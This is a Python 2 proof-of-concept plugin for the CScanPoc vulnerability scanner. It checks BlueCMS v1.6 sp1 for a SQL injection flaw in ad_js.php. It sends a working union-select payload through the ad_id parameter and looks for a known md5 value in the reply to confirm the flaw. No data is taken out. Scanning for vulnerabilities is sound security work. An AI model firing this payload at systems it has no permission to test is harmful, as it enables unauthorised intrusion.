# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'BlueCMS_0000' # 平台漏洞编号，留空
    name = 'BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2010-08-03'  # 漏洞公布时间
    desc = '''
        BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞
    ''' # 漏洞描述
    ref = 'http://www.myhack58.com/Article/html/3/7/2010/27774_2.htm' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'BlueCMS'  # 漏洞应用名称
    product_version = '1.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3a3d5d61-27d3-4d4f-b2c1-ab4492af4af1'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,md5(3.1415),md5(3.1415)"
            url = arg + payload
            code, head, res, errcode, _ = hh.http('"%s"' % url)
            if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()